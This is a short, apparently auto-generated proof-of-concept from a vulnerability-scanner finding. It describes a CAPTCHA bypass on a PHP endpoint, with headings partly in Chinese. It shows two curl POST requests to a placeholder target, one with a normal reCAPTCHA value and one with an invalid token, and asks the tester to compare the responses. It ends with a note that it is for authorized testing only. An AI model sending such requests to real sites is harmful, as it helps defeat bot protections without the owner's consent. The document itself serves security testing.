# POC — AWVS: CAPTCHA Bypass

- finding_id: `URL-1392c47070be`
- type: `captcha_bypass` / CWE-804
- severity: `high`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X POST 'http://TARGET:8080/013.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'g-recaptcha-response=SafeText'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (验证码绕过)**  
```http
curl -sS -i -X POST 'http://TARGET:8080/013.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'g-recaptcha-response=invalid'
```
预期：The attack response differs from the baseline in status, length, or a security-relevant marker.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。